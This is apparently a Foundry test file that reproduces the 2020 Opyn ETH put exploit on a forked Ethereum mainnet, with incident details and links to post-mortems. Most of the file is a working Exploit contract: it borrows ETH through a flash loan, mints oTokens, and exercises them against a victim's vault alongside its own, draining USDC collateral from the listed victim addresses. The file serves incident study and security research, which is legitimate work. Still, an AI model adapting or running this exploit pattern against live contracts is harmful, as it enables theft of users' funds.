// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~370k USD
//   - Check `https://docs.google.com/spreadsheets/d/1FmMIHfWm3E5LQa3JBH1CFy6NO4jI6DAQS__Ph0b__lQ/edit` for more details
// Attacked At : Mainnet, block height 10592428, 2020-08-04T09:25:54Z
// Vulnerability Type : Business Logic Flaw
// Attacker : 0x915c2d6f571d3d47a182dd59d5f41e87d4c3fb8e
// Exploit Contract : 0xe7870231992ab4b1a01814fa0a599115fe94203f
// Revenue Address :
//   - 0x915c2d6f571d3d47a182dd59d5f41e87d4c3fb8e
//   - 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4 (received 113 EtherToken)
// Victim Contract : N/A
//   - Victims are oETH put sellers, check link below to get all victim addresses.
//   - https://docs.google.com/spreadsheets/d/1FmMIHfWm3E5LQa3JBH1CFy6NO4jI6DAQS__Ph0b__lQ/edit
//
// Vulnerable Snippet :
//   - https://github.com/opynfinance/Convexity-Protocol-Archived/blob/master/contracts/OptionsContract.sol#L809
//
// Attack Txs :
//   - Check `https://etherscan.io/address/0x915C2D6f571d3d47A182Dd59D5F41e87d4c3fb8E` for more details
// @Ref
// Official Announcement: https://medium.com/opyn/opyn-eth-put-exploit-c5565c528ad2
// Official Post-Mortem : https://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8
// PeckShield : https://peckshield.medium.com/opyn-hacks-root-cause-analysis-c65f3fe249db


contract Attacker is Test {
    IUSDC private constant usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IEtherToken private constant etherToken = IEtherToken(0x0B7dc5A43Ce121b4EaaA41b0F4f43BBA47Bb8951);
    Exploit exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", 10_592_395);
        vm.deal(address(this), 0);
        exploit = new Exploit();
    }

    function testAttack() public {
        console.log("[Before Attack] ETH.balanceOf(ATTACKER) = %18e", address(this).balance);
        console.log("[Before Attack] ETH.balanceOf(EXPLOIT) = %18e", address(exploit).balance);
        console.log("[Before Attack] USDC.balanceOf(ATTACKER) = %6e", usdc.balanceOf(address(this)));
        console.log("[Before Attack] USDC.balanceOf(EXPLOIT) = %6e", usdc.balanceOf(address(exploit)));
        console.log("[Before Attack] EtherToken.balanceOf(ATTACKER) = %18e", etherToken.balanceOf(address(this)));
        console.log("[Before Attack] EtherToken.balanceOf(EXPLOIT) = %18e", etherToken.balanceOf(address(exploit)));
        console.log("----------------------------------------");

        // 0 external calls
        exploit.func_0xe80d7537(""); // txid: 0x89ac16c20a8deafdb405eb04411c484782beb0a9694fc460b2839f86e76a2f83, height 10592396, T
        exploit.func_0xe80d7537(""); // txid: 0x9a0939618979c7514a71fedc2d1438a81b944b1ffe9aa557ff0a2f9bfaf14fd2, height 10592396, T
        
        // Borrow ETH and use it to get oETH
        // txid: 0xa858463f30a08c6f3410ed456e59277fbe62ff14225754d2bb0b4f6a75fdc8ad, height 10592402, T
        exploit.func_0x08e9147b(255 ether, 24 ether, 2_720_000_000, 89_900_000_000, 0x076C95c6cd2eb823aCC6347FdF5B3dd9b83511E4, 0);

        // Swap ETH in ExploitContract to USDC
        // txid: 0xcd1ce9347632f4313ce747aca80129933bbe35e941090d0f6b551ce73a0c0904, height 10592419, T+1m4s
        exploit.getUSDC(75 ether);

        //--------------------------------------------------------------------------------------------------------
        // txid: 0xd06378b73536e7718895069a5219855774d362db47312dc304dfd4b6e39ef000, height 10592428, T+5m28s
        address[] memory victims_1 = new address[](1);
        uint256[] memory amtToCreates_1 = new uint256[](1);
        victims_1[0] = 0x25125E438b7Ae0f9AE8511D83aBB0F4574217C7a;
        amtToCreates_1[0] = 750_000_000;
        exploit.func_0xfad517ac(victims_1, amtToCreates_1); 

        // txid: 0x351bcbb182cb11cecb0d50d9f1bf45bd6820b71f7de5ec1ef607518865d43dc2, height 10592504, T+19m48s
        address[] memory victims_2 = new address[](2);
        uint256[] memory amtToCreates_2 = new uint256[](2);
        victims_2[0] = 0x2CaA6c95dCbe5a4beD332bDC59D5219d89398a54;
        victims_2[1] = 0xC5Df4d5ED23F645687A867D8F83a41836FCf8811;
        amtToCreates_2[0] = 180_000_000;
        amtToCreates_2[1] = 270_000_000;
        exploit.func_0xfad517ac(victims_2, amtToCreates_2); 

        // txid: 0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a, height 10592517, T+21m30s
        address[] memory victims_3 = new address[](1);
        uint256[] memory amtToCreates_3 = new uint256[](1);
        victims_3[0] = 0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2;
        amtToCreates_3[0] = 300_000_000;
        exploit.func_0xfad517ac(victims_3, amtToCreates_3); 
        //--------------------------------------------------------------------------------------------------------
        
        // Deposit 5 ETH and transfer EtherToken to 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4 (probably another EOA that under attacker's control)
        // txid: 0x30d41ecb0d5806d862931ac77bb8d3812abaf0a11bba7d624204124a7aa9978e, height 10592539, T+26m3s
        exploit.func_0x91622bd5(address(this), 5 ether);

        // Deposit 108 ETH and transfer EtherToken to 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4 (probably another EOA that under attacker's control)
        // txid: 0x91e5e6aa2edd65252620a15303bf733a5d0a20d5458dd41502c77fe8ec456b1d, height 10592551, T+28m20s
        exploit.func_0x91622bd5(address(this), 108 ether);

        // Swap USDC to ETH
        // txid: 0xda1f731ce0275488c9b77440dfa581c3f972e559d8086c5be77cf07d01af09a7, height 10592556, T+29m30s
        exploit.getETH(usdc.balanceOf(address(exploit)));

        // Withdraw the ETHs in ExploitContract to 0x9f0af03de9492aa4dd83943cd4c5463bb740b336 (probably another EOA that under attacker's control)
        // txid: 0xea1fb009b0ef1673de2ba6a82afff766cd0e68e1c089dc532cec40864c295590, height 10592563, T+31m37s
        exploit.func_0x29584868(address(this), "");

        // 0 external calls
        // txid: 0xe332e0946b0fe23e412d488412048d324341f886236cb20d658dc22142870f5b, height 10592566, T+32m53s
        exploit.func_0x032a67c2(0, true);

        //--------------------------------------------------------------------------------------------------------

        console.log("[After Attack] ETH.balanceOf(ATTACKER) = %18e", address(this).balance);
        console.log("[After Attack] ETH.balanceOf(EXPLOIT) = %18e", address(exploit).balance);
        console.log("[After Attack] USDC.balanceOf(ATTACKER) = %6e", usdc.balanceOf(address(this)));
        console.log("[After Attack] USDC.balanceOf(EXPLOIT) = %6e", usdc.balanceOf(address(exploit)));
        console.log("[After Attack] EtherToken.balanceOf(ATTACKER) = %18e", etherToken.balanceOf(address(this)));
        console.log("[After Attack] EtherToken.balanceOf(EXPLOIT) = %18e", etherToken.balanceOf(address(exploit)));
    }

    receive() external payable {}

    function tokenFallback(address, uint256, bytes calldata) public {}

}

contract Exploit {
    IoToken private constant oETH330Put = IoToken(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2); // Opyn ETH Put $330 08/14/20
    ILiquidityPoolV1 private constant liquidityPool = ILiquidityPoolV1(0xEB7e15B4E38CbEE57a98204D05999C3230d36348);
    IUniV1Factory private constant UniV1Factory = IUniV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
    IUSDC private constant usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IEtherToken private constant etherToken = IEtherToken(0x0B7dc5A43Ce121b4EaaA41b0F4f43BBA47Bb8951);
    address private constant eth = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    uint256 _ethToUSDCSwapInputAmount;
    uint256 _ethToOETHSwapInputAmount;
    uint256 _ethExerciseInputAmount;
    uint256 _collateralAmount;
    address _vaultExerciseFrom;
    
    function func_0xfad517ac(address[] calldata victims, uint256[] calldata amtToCreates) public {
        for (uint i = 0; i < victims.length; ++i) {
            oETH330Put.addERC20CollateralOption(amtToCreates[i], amtToCreates[i]*33, address(this));

            address[] memory vaultsToExerciseFrom = new address[](2);
            vaultsToExerciseFrom[0] = address(this);
            vaultsToExerciseFrom[1] = victims[i];

            oETH330Put.exercise{value: amtToCreates[i] * 1e11}(amtToCreates[i] * 2, vaultsToExerciseFrom);

            oETH330Put.removeUnderlying();
        }
    }
    function func_0x08e9147b(uint256 ethToUSDCSwapInputAmount, uint256 ethToOETHSwapInputAmount, uint256 ethExerciseInputAmount, uint256 collateralAmount, address vaultExerciseFrom, uint256) public {
        _ethToUSDCSwapInputAmount = ethToUSDCSwapInputAmount;
        _ethToOETHSwapInputAmount = ethToOETHSwapInputAmount;
        _ethExerciseInputAmount = ethExerciseInputAmount;
        _collateralAmount = collateralAmount;
        _vaultExerciseFrom = vaultExerciseFrom;
        liquidityPool.borrow(eth, 856 ether, ""); // not sure how the 856 ether is calculated, we use hardcoded here instead
    }

    function getUSDC(uint256 amount) public {
        require(address(this).balance >= amount, "Insufficient balance");
        address UniV1_USDC_ETH = UniV1Factory.getExchange(address(usdc));
        IUniswapV1(UniV1_USDC_ETH).ethToTokenSwapInput{value: amount}(1, 1699997362);
        // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker by attacker
    }

    fallback() external payable {
        if (msg.sender == address(liquidityPool)) {
            address UniV1_USDC_ETH = UniV1Factory.getExchange(address(usdc));
            address UniV1_oETH330Put_ETH = UniV1Factory.getExchange(address(oETH330Put));

            usdc.approve(UniV1_USDC_ETH, 100 ether);
            usdc.approve(address(oETH330Put), 100 ether);

            IUniswapV1(UniV1_USDC_ETH).ethToTokenSwapInput{value: _ethToUSDCSwapInputAmount}(1, 1699997362);
            IUniswapV1(UniV1_oETH330Put_ETH).ethToTokenSwapInput{value: _ethToOETHSwapInputAmount}(1, 1699997362);
            // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker

            oETH330Put.createERC20CollateralOption(_ethExerciseInputAmount, _collateralAmount, address(this));

            address[] memory vaultsToExerciseFrom = new address[](2);
            vaultsToExerciseFrom[0] = address(this);
            vaultsToExerciseFrom[1] = _vaultExerciseFrom;
            
            oETH330Put.exercise{value: _ethExerciseInputAmount * 1e11}(_ethExerciseInputAmount*2, vaultsToExerciseFrom);

            oETH330Put.removeUnderlying();

            IUniswapV1(UniV1_USDC_ETH).tokenToEthSwapInput(usdc.balanceOf(address(this)), 1, 1699997362);
            // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker
            
            payable(address(liquidityPool)).transfer(msg.value + 0.1 ether);
        }
    }

    function func_0x91622bd5(address transferTo, uint256 amount) public {
        require(address(this).balance >= amount, "Invalid amount");
        etherToken.depositAndTransfer{value: amount}(transferTo, amount, "");
    }
    
    function getETH(uint256 _amount) public {
        address UniV1_USDC_ETH = UniV1Factory.getExchange(address(usdc));
        IUniswapV1(UniV1_USDC_ETH).tokenToEthSwapInput(_amount, 1, 1699997362);
        // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker
    }

    function func_0x29584868(address sendTo, bytes32) public {
        payable(sendTo).transfer(address(this).balance);
    }

    function func_0xe80d7537(bytes calldata) public {
        // I skipped this function's implementation because it's not necessary for the attack
    }

    function func_0x032a67c2(bytes32, bool) public {
        // I skipped this function's implementation because it's not necessary for the attack   
    } 
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------
interface IoToken {
    function addERC20CollateralOption(uint256 amtToCreate, uint256 amtCollateral, address receiver) external;
    function createERC20CollateralOption(uint256 amtToCreate, uint256 amtCollateral, address receiver) external;
    function exercise(uint256 oTokensToExercise, address[] memory vaultsToExerciseFrom) external payable;
    function removeUnderlying() external;
}

interface ILiquidityPoolV1 {
    function borrow(address _token, uint256 _amount, bytes memory _data) external;
}

interface IUniV1Factory {
    function getExchange(address token) external view returns (address out);
}

interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV1 {
    function ethToTokenSwapInput(uint256 min_token, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

interface IEtherToken {
    function balanceOf(address owner) external view returns (uint256 balance);
    function depositAndTransfer(address transferTo, uint256 amount, bytes memory data) external payable;
}
